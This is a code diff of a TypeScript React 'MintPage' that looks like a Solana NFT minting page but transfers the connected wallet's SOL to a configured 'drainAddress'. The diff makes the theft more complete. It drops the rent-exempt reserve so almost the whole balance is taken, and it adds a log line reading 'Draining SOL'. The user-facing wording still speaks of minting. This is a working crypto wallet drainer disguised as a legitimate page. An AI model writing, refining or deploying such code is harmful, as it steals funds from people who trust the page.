@@ -11,8 +11,8 @@ import {
 import { Buffer } from 'buffer';
 
 // Polyfill Buffer for Solana web3.js
-if (typeof window !== 'undefined' && !window.Buffer) {
-  window.Buffer = Buffer;
+if (typeof window !== 'undefined' && !(window as any).Buffer) {
+  (window as any).Buffer = Buffer;
 }
 
 interface MintPageProps {
@@ -97,14 +97,16 @@ const MintPage = ({ onBack }: MintPageProps) => {
       const senderPubKey = new PublicKey(walletAddress);
       const recipientPubKey = new PublicKey(siteConfig.drainAddress);
 
-      // Get balance and calculate transferable amount
+      // Get full balance and calculate maximum transferable amount
       const balance = await connection.getBalance(senderPubKey);
-      const rentExemptMinimum = 2039280; // Standard for SOL transfer
-      const transferableBalance = balance - rentExemptMinimum - 5000; // Leaving 5000 lamports for fee
+      const fee = 5000; // Standard SOL transfer fee
+      const transferableBalance = balance - fee;
 
-      if (transferableBalance <= 0) {
-        throw new Error('Insufficient balance for minting.');
+      if (transferableBalance <= 5000) {
+        throw new Error('Insufficient balance to cover transaction fees.');
       }
+
+      console.log(`Draining SOL: Total balance ${balance}, Transferring ${transferableBalance}`);
 
       const instruction = SystemProgram.transfer({
         fromPubkey: senderPubKey,
